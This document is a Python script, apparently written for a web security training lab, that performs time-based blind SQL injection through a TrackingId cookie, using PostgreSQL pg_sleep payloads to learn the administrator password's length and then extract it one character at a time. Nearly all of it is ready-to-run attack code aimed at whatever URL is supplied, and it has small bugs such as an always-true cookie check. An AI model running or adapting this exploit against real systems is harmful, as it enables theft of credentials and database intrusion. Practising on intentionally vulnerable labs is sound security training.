### Lab: Blind SQL injection with time delays and information retrieval

import requests
import argparse
import string
import time

def par():
    parser = argparse.ArgumentParser(description='Blind SQL injection with time delays and information retrieval')
    parser.add_argument('--url', type=str, required=True, help='The URL of the target.')
    return parser.parse_args()

def req(url):
    r = requests.get(url)
    cookie = r.cookies.get_dict()
    trackingId = None
    for name, value in cookie.items():
        if 'TrackingId' in name:
            trackingId = value
            break
    if 'TrackingId' != None:
        print(f'[+] Found trackingId: {trackingId}')
    else:
        print('[-] TrackingId not found in cookies')

    return trackingId

def password_length(url, trackingId):
    length = 1

    while length <= 25:
        payload = (
            trackingId +
            f"'%3b+SELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)>={length})"
            "+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+Users--"
        )

        cookies = {'TrackingId': payload}

        start_time = time.time()
        requests.get(url, cookies=cookies, timeout=15)
        end_time = time.time()

        if end_time - start_time >= 3:
            length += 1
        else:
            print(f"[+] Found password length: {length - 1}")
            return length - 1
    
    return password_length

def pass_extract(url, trackingId, password_length):
    password = ''
    for position in range(password_length):
        found_chars = False
        for char in string.ascii_letters + string.digits:
            payload = (
                trackingId +
                f"'%3b+SELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,{position+1},1)='{char}')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+Users--"
            )
            cookies = {'TrackingId': payload}

            start_time = time.time()
            requests.get(url, cookies=cookies, timeout=15)
            end_time = time.time()

            if end_time - start_time >= 3:
                password += char
                found_chars = True
                print(f"\r[+] Found character in the password: {password}", end='', flush=True)
                break
        if not found_chars:
            break

if __name__ == '__main__':
    args = par()
    trackingId = req(args.url)
    if trackingId:
        password_length = password_length(args.url, trackingId)
        if password_length:
            pass_extract(args.url, trackingId, password_length)
